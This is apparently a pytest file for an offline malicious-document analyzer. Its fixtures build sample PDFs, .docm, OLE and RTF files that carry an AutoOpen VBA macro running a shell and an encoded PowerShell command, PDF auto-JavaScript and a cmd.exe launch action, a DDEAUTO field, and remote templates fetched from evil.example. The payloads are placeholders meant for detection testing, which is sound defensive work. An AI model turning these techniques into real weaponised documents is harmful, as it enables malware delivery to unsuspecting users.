"""Tests for the offline document analyzer (PDF / OOXML / OLE / RTF).

Every fixture is a real file built byte-by-byte — including a valid OLE
compound file whose VBA module source is MS-OVBA compressed — so the analyzer
and its CFB/OVBA parsers are exercised for real, not mocked.
"""

from __future__ import annotations

import struct
import zipfile
import zlib

from heaven.forensics.dispatch import analyze_artifact, detect_kind
from heaven.forensics.document import (
    _ovba_decompress, analyze_document,
)

_VBA_SRC = (b'Attribute VB_Name = "Module1"\r\nSub AutoOpen()\r\n'
            b'  Shell "calc.exe"\r\n'
            b'  CreateObject("WScript.Shell").Run "powershell -enc AAAA"\r\n'
            b'End Sub\r\n')


def _ovba_compress(src: bytes) -> bytes:
    """MS-OVBA all-literal compressed container (a valid container the real
    algorithm decompresses)."""
    out = bytearray([0x01])
    i = 0
    while i < len(src):
        chunk = src[i:i + 4096]
        i += 4096
        data = bytearray()
        j = 0
        while j < len(chunk):
            group = chunk[j:j + 8]
            j += 8
            data.append(0x00)
            data += group
        hdr = 0x8000 | 0x3000 | ((len(data) - 1) & 0x0FFF)
        out += struct.pack("<H", hdr) + data
    return bytes(out)


_FREE, _END, _FAT = 0xFFFFFFFF, 0xFFFFFFFE, 0xFFFFFFFD


def _dirent(name, otype, start, size, child=_FREE):
    nb = (name.encode("utf-16-le") + b"\x00\x00")[:64].ljust(64, b"\x00")
    e = bytearray(128)
    e[0:64] = nb
    struct.pack_into("<H", e, 64, min(len(name) + 1, 32) * 2)
    e[66] = otype
    e[67] = 1
    struct.pack_into("<III", e, 68, _FREE, _FREE, child)
    struct.pack_into("<I", e, 116, start)
    struct.pack_into("<I", e, 120, size)
    return bytes(e)


def _make_cfb(module_bytes: bytes) -> bytes:
    """A minimal but valid OLE2/CFB file with one VBA module stream."""
    SEC, MINI = 512, 64
    k = (len(module_bytes) + MINI - 1) // MINI or 1
    mini_container = module_bytes.ljust(k * MINI, b"\x00").ljust(SEC, b"\x00")
    fat = [_FAT, _END, _END, _END] + [_FREE] * (128 - 4)
    fat_sec = b"".join(struct.pack("<I", x) for x in fat)
    directory = (_dirent("Root Entry", 5, 3, k * MINI, child=1)
                 + _dirent("VBA", 1, _FREE, 0)
                 + _dirent("Module1", 2, 0, len(module_bytes))).ljust(SEC, b"\x00")
    mf = [(n + 1 if n < k - 1 else _END) for n in range(k)] + [_FREE] * (128 - k)
    minifat = b"".join(struct.pack("<I", x) for x in mf)
    h = bytearray(512)
    h[0:8] = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1"
    struct.pack_into("<H", h, 24, 0x003E)
    struct.pack_into("<H", h, 26, 0x0003)
    struct.pack_into("<H", h, 28, 0xFFFE)
    struct.pack_into("<H", h, 30, 9)
    struct.pack_into("<H", h, 32, 6)
    struct.pack_into("<I", h, 44, 1)
    struct.pack_into("<I", h, 48, 1)
    struct.pack_into("<I", h, 56, 4096)
    struct.pack_into("<I", h, 60, 2)
    struct.pack_into("<I", h, 64, 1)
    struct.pack_into("<I", h, 68, _END)
    struct.pack_into("<I", h, 72, 0)
    struct.pack_into("<I", h, 76, 0)
    for n in range(1, 109):
        struct.pack_into("<I", h, 76 + n * 4, _FREE)
    return bytes(h) + fat_sec + directory + minifat + mini_container


def _vba_bin() -> bytes:
    return _make_cfb(_ovba_compress(_VBA_SRC))


# ── OVBA round-trip ──
def test_ovba_decompress_roundtrip():
    assert _ovba_decompress(_ovba_compress(_VBA_SRC)) == _VBA_SRC


# ── PDF ──
def _evil_pdf() -> bytes:
    comp = zlib.compress(b"<< /S /JavaScript /JS (app.alert(2);) >>")
    return (b"%PDF-1.7\n"
            b"1 0 obj<< /Type /Catalog /OpenAction 2 0 R >>endobj\n"
            b"2 0 obj<< /S /JavaScript /JS (app.alert\\(1\\);) >>endobj\n"
            b"3 0 obj<< /S /Launch /F (cmd.exe) >>endobj\n"
            b"4 0 obj<< /EmbeddedFile 1 0 R /F (payload.exe) >>endobj\n"
            b"5 0 obj<< /Length " + str(len(comp)).encode()
            + b" /Filter /FlateDecode >>stream\n" + comp + b"\nendstream endobj\n"
            b"7 0 obj<< /Type /Page >>endobj\ntrailer<< /Root 1 0 R >>\n%%EOF\n")


def test_pdf_auto_javascript_and_launch(tmp_path):
    p = tmp_path / "e.pdf"
    p.write_bytes(_evil_pdf())
    r = analyze_document(str(p))
    vts = {f["vuln_type"] for f in r["findings"]}
    assert "pdf_auto_javascript" in vts
    assert "pdf_launch_action" in vts
    assert "pdf_embedded_file" in vts
    assert r["report"]["pdf_version"] == "1.7"


def test_pdf_flate_compressed_js_is_seen(tmp_path):
    # The only /JavaScript token lives inside a FlateDecode stream.
    comp = zlib.compress(b"<< /S /JavaScript /JS (evil()) >>")
    p = tmp_path / "c.pdf"
    p.write_bytes(b"%PDF-1.5\n1 0 obj<< /OpenAction 2 0 R >>endobj\n"
                  b"2 0 obj<< /Length " + str(len(comp)).encode()
                  + b" /Filter /FlateDecode >>stream\n" + comp
                  + b"\nendstream endobj\n%%EOF\n")
    r = analyze_document(str(p))
    assert any(f["vuln_type"].startswith("pdf_") and "javascript" in f["vuln_type"]
               for f in r["findings"])


# ── OOXML (.docm) ──
def _evil_docm(path):
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", "<Types/>")
        zf.writestr("word/document.xml",
                    '<w:document><w:fldSimple w:instr=" DDEAUTO cmd /c calc "/>'
                    '</w:document>')
        zf.writestr("word/vbaProject.bin", _vba_bin())
        zf.writestr("word/_rels/settings.xml.rels",
                    '<Relationships><Relationship Id="r1" '
                    'Type="http://schemas.openxmlformats.org/officeDocument/2006/'
                    'relationships/attachedTemplate" '
                    'Target="http://evil.example/t.dotm" TargetMode="External"/>'
                    '</Relationships>')


def test_docm_macros_template_injection_dde(tmp_path):
    p = tmp_path / "e.docm"
    _evil_docm(p)
    r = analyze_document(str(p))
    vts = {f["vuln_type"] for f in r["findings"]}
    assert "ooxml_vba_macro" in vts
    assert "ooxml_template_injection" in vts
    assert "ooxml_dde" in vts
    macro = next(f for f in r["findings"] if f["vuln_type"] == "ooxml_vba_macro")
    assert macro["severity"] == "high"      # AutoOpen/Shell → high
    assert "AutoOpen" in macro["evidence"]["keywords"]


# ── legacy OLE (.doc) ──
def test_ole_vba_macro_extracted(tmp_path):
    p = tmp_path / "e.doc"
    p.write_bytes(_vba_bin())
    r = analyze_document(str(p))
    assert r["report"]["cfb_parsed"] is True
    assert "Module1" in r["report"]["vba_modules"]
    assert any(f["vuln_type"] == "ole_vba_macro" for f in r["findings"])


# ── RTF ──
def test_rtf_equation_editor_and_object(tmp_path):
    rtf = (r"{\rtf1{\object\objemb{\*\objclass Equation.3}"
           r"{\*\objdata 0105}}{\*\template http://evil.example/e.dotm}}").encode()
    p = tmp_path / "e.rtf"
    p.write_bytes(rtf)
    r = analyze_document(str(p))
    vts = {f["vuln_type"] for f in r["findings"]}
    assert "rtf_equation_editor" in vts
    assert "rtf_embedded_object" in vts
    assert "rtf_remote_template" in vts


# ── dispatch routing + shared enrichment ──
def test_dispatch_routes_and_enriches(tmp_path):
    p = tmp_path / "e.pdf"
    p.write_bytes(_evil_pdf())
    assert detect_kind(str(p)) == "document"
    r = analyze_artifact(str(p))
    assert r["kind"] == "document"
    ov = r["report"]["file_overview"]
    assert ov["magic"] == "PDF document"
    assert len(ov["sha256"]) == 64
    assert ov["mime"] == "application/pdf"


def test_ooxml_detected_by_content(tmp_path):
    p = tmp_path / "noext"
    _evil_docm(p)
    assert detect_kind(str(p)) == "document"
